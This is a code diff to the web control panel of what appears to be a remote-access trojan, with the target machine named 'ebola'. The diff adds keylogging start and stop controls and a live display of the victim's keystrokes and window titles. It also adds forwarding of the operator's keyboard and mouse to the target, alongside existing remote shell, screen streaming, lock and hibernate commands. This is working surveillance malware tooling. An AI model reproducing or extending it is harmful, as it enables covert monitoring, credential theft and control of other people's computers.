@@ -8,15 +8,15 @@
 		<link href="https://cdn.jsdelivr.net/npm/daisyui@4.10.2/dist/full.min.css" rel="stylesheet" type="text/css" />
 		<script src="https://cdn.tailwindcss.com"></script>
 	</head>
-	<body>
+	<body class="max-h-[100dvh]">
 		<img
 			id="stream_full"
 			class="z-40 aspect-video rounded-md absolute min-h-[95dvh] top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 min-w-screen hidden" />
 		<div class="z-50 badge badge-primary badge-lg absolute bottom-3 right-5 cursor-pointer hidden" id="fullscreen_button_full">&#x26F6;</div>
 		<div id="overlay" class="hidden bg-base-100 relative min-h-screen min-w-screen"></div>
 
-		<main class="grid grid-cols-2 h-full w-full p-4 gap-4">
-			<div class="w-full col-span-2 flex items-center gap-3">
+		<main class="grid grid-cols-2 h-full w-full p-4 gap-4 max-h-[inherit]">
+			<div class="w-full col-span-2 flex items-center gap-3 h-[40px]">
 				<div class="font-medium text-3xl"><%= ebola.name %></div>
 				<% if (ebola.status === 'online') { %>
 				<div id="status-badge" class="badge badge-xl badge-success relative top-1"></div>
@@ -24,7 +24,7 @@
 				<div id="status-badge" class="badge badge-xl badge-error relative top-1"></div>
 				<% } %>
 			</div>
-			<div class="card border-2 border-primary rounded-xl h-full h-full w-full">
+			<div class="card border-2 border-primary rounded-xl h-full w-full max-h-[inherit]">
 				<div class="min-h-2xl h-2xl aspect-video px-3 pt-3 relative">
 					<img id="stream" class="aspect-video rounded-md" />
 					<audio id="audio" autoplay></audio>
@@ -62,10 +62,7 @@
 							</div>
 						</div>
 						<div class="information grid my-auto grid-rows-2 auto-cols-auto grid-flow-col min-h-none min-w-none gap-x-10 gap-y-5">
-							<div class="elapsed bg-base-100 overflow-hidden min-w-none rounded-md border-2 border-primary p-4">
-								<label>Time Elapsed</label>
-								<span id="minutes">00</span>:<span id="seconds">00</span>
-							</div>
+							<button class="btn btn-primary" id="start_keylog">Start Keylogging</button>
 							<button class="btn btn-primary" onclick="new_file.showModal()">New File</button>
 							<dialog id="new_file" class="modal">
 								<div class="modal-box w-11/12 max-w-5xl min-h-[80%]">
@@ -95,11 +92,8 @@
 								</div>
 							</dialog>
 
-							<div class="elapsed bg-base-100 overflow-hidden min-w-none rounded-md border-2 border-primary p-4">
-								<label>Time Elapsed</label>
-								<span id="minutes">00</span>:<span id="seconds">00</span>
-							</div>
-							<button class="btn btn-primary" onclick="edit_file.showModal()">Edit File</button>
+							<button class="btn btn-neutral" id="stop_keylog">Stop Keylogging</button>
+							<button class="btn btn-primary" disabled="disabled" onclick="edit_file.showModal()">Edit File</button>
 							<dialog id="edit_file" class="modal">
 								<div class="modal-box w-11/12 max-w-5xl min-h-[80%]">
 									<h3 class="font-bold text-lg">Edit File</h3>
@@ -128,39 +122,38 @@
 								</div>
 							</dialog>
 
-							<div class="elapsed bg-base-100 overflow-hidden min-w-none rounded-md border-2 border-primary p-4">
-								<label>Time Elapsed</label>
-								<span id="minutes">00</span>:<span id="seconds">00</span>
-							</div>
+							<button class="btn btn-primary btn-neutral" id="transmitKBD">Toggle KBD Transmit</button>
 							<button
 								class="btn btn-neutral"
 								onclick="socket.emit('command_input', 'C:\\Windows\\System32\\Rundll32.exe user32.dll,LockWorkStation')">
 								Lock Screen
 							</button>
 
-							<div class="elapsed bg-base-100 overflow-hidden min-w-none rounded-md border-2 border-primary p-4">
-								<label>Time Elapsed</label>
-								<span id="minutes">00</span>:<span id="seconds">00</span>
-							</div>
-							<button class="btn btn-error" onclick="socket.emit('command_input', 'C:\\Windows\\System32\\shutdown.exe /h /t 0')">
+							<button class="btn btn-primary btn-neutral" id="transmitMouse">Toggle Mouse Transmit</button>
+							<button class="btn btn-error" onclick="socket.emit('command_input', 'C:\\Windows\\System32\\shutdown.exe /h')">
 								Shut Down (Hibernate)
 							</button>
 						</div>
 					</div>
 				</div>
 			</div>
-			<div class="cmds gap-3 border-2 border-primary rounded-xl h-full max-h-[inherit] w-full p-3">
-				<div class="log w-full h-full overflow-x-auto overflow-y-auto">
-					<div id="command-log" class="font-mono border-[2px] px-2 pt-1 border-neutral rounded-md min-h-full w-full overflow-y-auto">
-						<p id="cmd-prompt">
-							<span class="font-bold dir">Loading...</span
-							><input
-								type="text"
-								class="bg-transparent border-none focus:outline-none font-mono w-0"
-								onkeypress="this.style.width = ((this.value.length + 1) * 9) + 'px';"
-								oninput="this.style.width = ((this.value.length + 1) * 9) + 'px';" />
-						</p>
+			<div class="border-2 gap-y-2 border-primary rounded-xl max-h-[inherit] h-full w-full grid grid-cols-1 grid-rows-3 p-3">
+				<div class="gap-3 max-h-[inherit] row-span-2 w-full border-2 px-2 pt-1 border-neutral rounded-md">
+					<div class="log w-full h-full overflow-x-auto overflow-y-auto">
+						<div id="command-log" class="font-mono min-h-full w-full overflow-y-auto">
+							<p id="cmd-prompt">
+								<span class="font-bold dir">Loading...</span
+								><input
+									type="text"
+									class="bg-transparent border-none focus:outline-none font-mono w-0"
+									onkeypress="this.style.width = ((this.value.length + 1) * 9) + 'px';"
+									oninput="this.style.width = ((this.value.length + 1) * 9) + 'px';" />
+							</p>
+						</div>
 					</div>
+				</div>
+				<div class="border-2 border-neutral rounded-md p-3 transition" id="keylog_cc">
+					<div id="keylog_container" class="overflow-y-auto max-h-[inherit]"></div>
 				</div>
 			</div>
 		</main>
@@ -168,7 +161,7 @@
 		<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
 		<script>
 			//#region socket init
-			const socket = io('http://<%= ebola.host %>:<%= ebola.port %>', { transports: ['websocket'] });
+			const socket = io('<%= ebola.host %>:<%= ebola.port %>', { transports: ['websocket'] });
 
 			document.addEventListener('DOMContentLoaded', event => {
 				let counter = 0;
@@ -210,7 +203,7 @@
 
 				const data = { status: status };
 
-				await fetch('http://localhost:4100/control/<%= ebola.name %>', {
+				await fetch('http://192.168.1.153:4100/control/<%= ebola.name.split(` `).join(`-`).toLowerCase() %>', {
 					method: 'POST',
 					body: JSON.stringify(data),
 					headers: {
@@ -277,6 +270,15 @@
 			document.getElementById('stream_fps').addEventListener('input', event => {
 				fps = event.target.value;
 			});
+
+			document.getElementById('start_keylog').addEventListener('click', event => {
+				document.getElementById('keylog_cc').classList.add('border-primary');
+				socket.emit('start_keylog');
+			});
+			document.getElementById('stop_keylog').addEventListener('click', event => {
+				document.getElementById('keylog_cc').classList.remove('border-primary');
+				socket.emit('stop_keylog');
+			});
 			//#endregion
 
 			//#region commands
@@ -334,6 +336,27 @@
 			});
 			//#endregion
 
+			//#region keylog
+			socket.on('keylog_press', key => {
+				document.getElementById('keylog_container').innerHTML += `<div class="kbd">${key}</div><br>`;
+			});
+
+			socket.on('keylog_press_con', key => {
+				if (document.getElementById('keylog_container').querySelector('#con')) {
+					document.getElementById('keylog_container').querySelector('#con').textContent += key;
+				} else {
+					document.getElementById('keylog_container').innerHTML += `<div class="kbd" id="con">${key}</div><br>`;
+				}
+			});
+
+			socket.on('keylog_screen_change', windowTitle => {
+				if (document.getElementById('keylog_container').querySelector('#con'))
+					document.getElementById('keylog_container').querySelector('#con').removeAttribute('id');
+
+				document.getElementById('keylog_container').innerHTML += `<div class="badge badge-xl badge-neutral">${windowTitle}</div><br>`;
+			});
+			//#endregion
+
 			//#region misc
 			document.getElementById('new_file_create').addEventListener('click', event => {
 				const directory = document.getElementById('new_file_path').value;
@@ -358,6 +381,43 @@
 				document.getElementById('fullscreen_button_full').classList.add('hidden');
 				document.getElementById('overlay').classList.add('hidden');
 				document.body.classList.remove('overflow-hidden');
+			});
+			//#endregion
+
+			//#region transmit keystrokes
+			let isTransmittingKeystrokes = false;
+			const transmitKBDButton = document.getElementById('transmitKBD');
+			transmitKBDButton.addEventListener('click', event => {
+				isTransmittingKeystrokes = !isTransmittingKeystrokes;
+
+				transmitKBDButton.classList.toggle('btn-neutral');
+			});
+			document.addEventListener('keydown', event => {
+				if (isTransmittingKeystrokes) {
+					event.preventDefault();
+
+					// Send key information via WebSocket
+					const keyData = {
+						key: event.key,
+						code: event.code,
+					};
+					socket.emit('keypress_down', keyData);
+				}
+			});
+			document.addEventListener('keyup', event => {
+				if (isTransmittingKeystrokes) {
+					event.preventDefault();
+
+					// Send key information via WebSocket
+					const keyData = {
+						key: event.key,
+						code: event.code,
+					};
+					socket.emit('keypress_up', keyData);
+				}
+			});
+			window.addEventListener('beforeunload', event => {
+				event.preventDefault();
 			});
 			//#endregion
 		</script>
